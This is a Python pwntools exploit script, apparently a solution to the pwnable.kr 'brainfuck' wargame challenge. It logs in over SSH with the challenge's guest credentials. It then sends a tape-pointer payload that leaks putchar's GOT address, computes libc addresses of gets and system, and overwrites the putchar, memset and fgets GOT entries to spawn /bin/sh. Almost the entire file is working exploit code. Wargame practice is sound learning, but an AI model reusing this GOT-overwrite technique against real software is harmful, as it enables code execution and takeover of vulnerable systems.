import os
from pwn import *
import time

def printd(s):
    print(f"\n*****DEBUG PRINT START\n\n {s} \n\nDEBUG PRINT END*****\n")
def sendraw(s, pr = True): 
    time.sleep(1.5)
    if pr: print(s)
    bf.send(s)
def sendl(s, pr = True): 
    time.sleep(1.5)
    if pr: print(s)
    bf.sendline(s)
def recv(line = False, pr = True): 
    time.sleep(1.5)
    raw = b''
    if (bf.can_recv(0.3) is False): return '', ''
    if line: 
        raw += bf.recvline()
    else: 
        while (bf.can_recv(0.2) is True):
            raw += bf.recv()
    data = raw.decode('utf-8', errors = 'replace')
    if pr: print(data)
    return raw, data

# ldd -r brainfreak // dependencies of the brainfreak executable
# readelf -S /lib/i386-linux-gnu/libc.so.6 | grep "putchar\nsystem"
# libc_file = "libc.so.6"
libc_file = "libc-2.23.so"

# bf = process('nc pwnable.kr 9001', shell = True)

sh = ssh(user = 'brainfuck', host = 'pwnable.kr', port = 2222, password = 'guest')
# bf = sh.run('ltrace -S -n 4 -o /tmp/k280_e2_out ./brainfuck') # -S: system calls as well | -n 4: indent nested calls | -D 77: show all ltrace debug messages
# bf = sh.run("./brainfuck | tee /tmp/k280_e2_out")     # use with libc.so.6
bf = sh.run("nc 0 9001")

elf = ELF(libc_file)
printd(f"elf.symbols['putchar']: {hex(elf.symbols['putchar'])} | elf.symbols['system']: {hex(elf.symbols['system'])}")

# -- run in debug
# bf = sh.run('gdb brainfuck')
# recv()
# sendl("b main")
# recv()
# sendl("run")
# recv()
# sendl("continue")

# get initial printout
recv()

payload1 = ""
payload1 += "<" * 112       # move tape ptr 112 bytes left, to putchar GOT entry
payload1 += "."             # putchar once, to populate GOT entry
payload1 += ".>.>.>."       # read putchar address
payload1 += "<<<,>,>,>,"    # replace address of putchar GOT entry with _start          -- payload2, part1
payload1 += "<" * 7         # move tape ptr to memset GOT entry
payload1 += ",>,>,>,"       # replace memset GOT entry with gets()                      -- payload2, part2
payload1 += "<" * 31        # move tape ptr to fgets GOT entry
payload1 += ",>,>,>,"       # replace fgets GOT entry with system()                     -- payload2, part3
payload1 += "."             # trigger

sendl(payload1)

# get response from payload1
raw, data = recv()

# extract address of putchar
addr_putchar = u32(raw[1:5])
addr_gets = addr_putchar - elf.symbols['putchar'] + elf.symbols['gets']
addr_system = addr_putchar - elf.symbols['putchar'] + elf.symbols['system']
# addr_start = p32(0x080484e0)
addr_start = p32(0x080484e0)
addr_postcanary = p32(0x804878e)
printd(f"putchar @ {hex(addr_putchar)}, system @ {hex(addr_system)}")

# construct 2nd part of payload: install addr_start into putchar() GOT entry, then install system() into strlen() GOT entry
payload2 = b''
payload2 += addr_start          # part 1
payload2 += p32(addr_gets)      # part 2
payload2 += p32(addr_system)    # part 3
sendraw(payload2) # send raw because these are being interpreted by getchar()
recv()

sendl("/bin/sh\x00")
# sendl("echo test5 > /tmp/k280" + (" " * 500)) # back to fgets(): send line, plus whitespace
# sendl("cat flag")
# recv()
# 
# sendl("ls")
# recv()
# 
# sendl("cat flag")
# recv()

# print(" --- enter command to execute in shell (/bin/sh to start interactive shell) ---")
bf.interactive()

